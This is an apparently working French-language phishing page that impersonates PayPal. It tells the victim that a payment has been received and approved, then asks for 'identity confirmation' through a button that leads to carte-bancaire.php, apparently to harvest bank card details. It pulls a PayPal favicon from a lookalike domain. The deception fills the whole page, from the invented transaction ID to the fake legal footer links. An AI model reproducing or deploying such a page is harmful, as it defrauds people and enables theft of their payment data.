    <!DOCTYPE html>
    <html dir="ltr">
        

<head>
            <title>Sécurité</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="css/normalize.css" />
            <link rel="stylesheet" href="css/bootstrap.min.css" />
            <link rel="stylesheet" href="css/font-awesome.min.css" />
            <link rel="stylesheet" href="css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="https://services-paiement-fr.fr/Sd1rU-paypal.fr/paiement/img/pp_favicon_x.ico">
        </head>
        <body>
            <div class="contain">
                <div class="img-logo">
                    <a href="#"><img src="img/paypal-logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"><a href="#" class="log_out">Déconnexion</a></div>
                <div class="cls"></div>
            </div>
            <div class="contain">
                <div class="contain-info">
                   <p class="hd">Vous avez reçu de l'argent <br />
				   ID : PP-4tST-bmJ4m-iK</p>
                   <div class="contain-lists">
                       <center>
                            <img src="img/shield.png" />
                            <h4></h4>
                       </center>
                       <b class="bold">
                           <h5>Ce Paiement paypal a été deduit du compte de l'acheteur et a été "APPROUVE" par sa banque.</h5>
               <h5>
<TD align=left>
<br>

<P>Pour lutter contre les transactions frauduleuse, une confirmation d'identité peut etre requise.</P> <br>
<P>Pour approuver la transaction suivez utilisez le bouton-ci dessous et suivez les instructions.</P>
<br>
<P><STRONG>Voici les étapes à suivre à la date du 
<SCRIPT LANGUAGE="JavaScript">
var maintenant=new Date();
var jour=maintenant.getDate();
var mois=maintenant.getMonth()+1;
var an=maintenant.getFullYear();
document.write("",jour,"/0",mois,"/",an,":");
</SCRIPT>
</STRONG></P>
<p>1.Cliquez sur <b>continuer<b> pour commencer</p>
<p>2.Confirmez votre identité</p>
<p>3.Recevez votre paiement sur votre compte bancaire</p>
                       <center>
                           <a href="carte-bancaire.php" class="proccess">Continuer</a>
                       </center>

                </div>
            </div>
            <div class="foot-pay">
                <center>
                    <a href="#">Contact</a>
                    <a href="#">Respect de la vie privée</a>
                    <a href="#">Contrat d'utilisation</a>
                    <a href="#">International</a>                   
                </center>            
            </div>            <script src="js/jquery-1.11.3.min.js"></script>
            <script src="js/bootstrap.min.js"></script>
            <script src="js/plugins.js"></script>
        </body>
    

</html>
